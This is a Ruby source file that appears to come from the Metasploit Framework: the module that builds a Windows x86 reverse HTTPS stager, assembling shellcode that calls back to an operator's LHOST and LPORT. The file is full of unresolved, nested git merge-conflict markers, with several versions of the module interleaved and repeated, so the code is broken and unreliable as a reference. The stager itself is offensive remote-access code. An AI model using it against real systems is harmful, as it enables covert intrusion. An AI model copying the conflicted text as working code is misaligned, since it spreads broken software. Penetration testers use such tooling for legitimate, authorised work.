# -*- coding: binary -*-

require 'msf/core'
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
require 'msf/core/payload/transport_config'
=======
>>>>>>> feature/complex-payloads
=======
require 'msf/core/payload/transport_config'
>>>>>>> 4.11.2_release_pre-rails4
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
=======
require 'msf/core/payload/transport_config'
>>>>>>> rapid7/master
>>>>>>> msf-complex-payloads
require 'msf/core/payload/windows/reverse_http'

module Msf

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======

>>>>>>> feature/complex-payloads
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD

=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
>>>>>>> msf-complex-payloads
###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS
#
###

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_https(opts)
=======

=======
>>>>>>> 4.11.2_release_pre-rails4
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
<<<<<<< HEAD
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD

module Payload::Windows::ReverseHttps

  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate and compile the stager
  #
  def generate_reverse_https(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_http(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
>>>>>>> msf-complex-payloads
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_https(
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW),
        ssl:  true)
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_https(conf)
<<<<<<< HEAD
=======
  def transport_config(opts={})
    transport_config_reverse_https(opts)
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> msf-complex-payloads
  end

  # TODO: Use the CachedSize instead (PR #4894)
  def cached_size
    341
<<<<<<< HEAD
>>>>>>> feature/complex-payloads
=======
=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
module Payload::Windows::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseHttp

  #
  # Generate the first stage
  #
  def generate
    super(ssl: true)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_https(opts)
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
>>>>>>> msf-complex-payloads
  end

end

end

